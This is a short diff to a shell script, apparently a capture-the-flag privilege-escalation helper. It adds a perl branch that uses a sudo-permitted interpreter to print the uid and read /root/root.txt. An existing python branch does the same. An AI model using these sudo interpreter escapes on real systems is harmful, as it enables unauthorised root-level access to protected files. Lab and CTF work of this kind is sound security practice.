@@ -13,6 +13,10 @@ case "$bin" in
         uid=$(sudo -n "$bin" -c 'import os; print(os.getuid())' 2>/dev/null | tr -d '[:space:]')
         flag=$(sudo -n "$bin" -c 'print(open("/root/root.txt").read())' 2>/dev/null || true)
         ;;
+    */perl)
+        uid=$(sudo -n "$bin" -e 'print $<, "\n"' 2>/dev/null | tr -d '[:space:]')
+        flag=$(sudo -n "$bin" -e 'open my $f, "<", "/root/root.txt"; print <$f>' 2>/dev/null || true)
+        ;;
     *)
         echo "no verified escape for $bin" >&2
         exit 2
